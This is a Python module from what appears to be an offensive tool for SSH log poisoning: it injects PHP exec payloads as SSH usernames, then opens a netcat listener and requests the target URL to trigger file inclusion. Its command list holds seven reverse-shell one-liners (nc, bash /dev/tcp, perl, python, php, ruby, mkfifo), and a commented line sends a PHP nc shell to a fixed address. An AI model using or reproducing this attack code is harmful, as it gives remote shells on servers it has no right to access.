from .prints import prints

import paramiko
import os
import ipaddress
import threading
import urllib.parse as urlparse
import time


COMMAD = [
    "nc -e /bin/sh HOSTNAME LPORT",
    "bash -i >& /dev/tcp/HOSTNAME/LPORT 0>&1",
    "perl -e 'use Socket;$i=\"HOSTNAME\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"HOSTNAME\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "php -r '$sock=fsockopen(\"HOSTNAME\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby -rsocket -e'f=TCPSocket.open(\"HOSTNAME\",LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc HOSTNAME LPORT >/tmp/f"
]
COMMAD = ["testing"]


class SSH_Pwn:
    def __init__(self, url, request):
        self.url = url
        self.request = request
        self.lhost = self.get_local_host()
        self.lport = self.get_local_port()
        self.hostname = self.get_netloc()
        self.exploits = self.get_exploits()
        #self.send("<?php shell_exec('nc -e /bin/sh 192.168.3.2 4444');?>")
        self.view_log_thread()

    def get_local_host(self):
        prints("Starting SSH log")
        prints("Enter Local Host, and Port for reverse shell to connect back too")
        local = prints("Host:", meth="input")
        try:
            ipaddress.ip_address(local)
        except ValueError:
            prints("Does not look like a valid IP address")
            return self.get_local_host()
        return local

    def get_local_port(self):
        port = prints("Port:", meth="input")
        try:
            port = int(port)
            if 1 < port < 65535:
                return port
        except ValueError:
            print("Invalid port")
            return self.get_local_port()

    def get_netloc(self):
        try:
            parsed_url = urlparse.urlparse(self.url)
            return parsed_url.netloc
        except Exception as e:
            prints(str(e), "error")
            print("Failed to parse URL", "error")
            host_name = prints("Manually enter the hostname of the target", meth="input")
            return host_name

    def get_exploits(self):
        exploits = []
        exploit = "<?php echo exec(\"CMD\"); ?>"
        for cmd in COMMAD:
            e = cmd.replace("HOSTNAME", self.lhost)
            e = e.replace("LPORT", str(self.lport))
            exploits.append(exploit.replace("CMD", e))
        return exploits

    def send(self, exploit):
        prints("Sending exploit:")
        prints(exploit)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(self.hostname, username=exploit, password="CrabSticks Github")
        except paramiko.ssh_exception.AuthenticationException:
            return

    def view_log_thread(self):
        prints("Starting listener")
        list_arg = [True, False]
        threads = [threading.Thread(target=self.view_log, args=(argument,)) for argument in list_arg]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

    def view_log(self, arg):
        if arg:
            print(arg)
            os.system(f"nc -vlnp {self.lport}")
        else:
            time.sleep(1)
            print(arg)
            self.request.send_get(self.url)

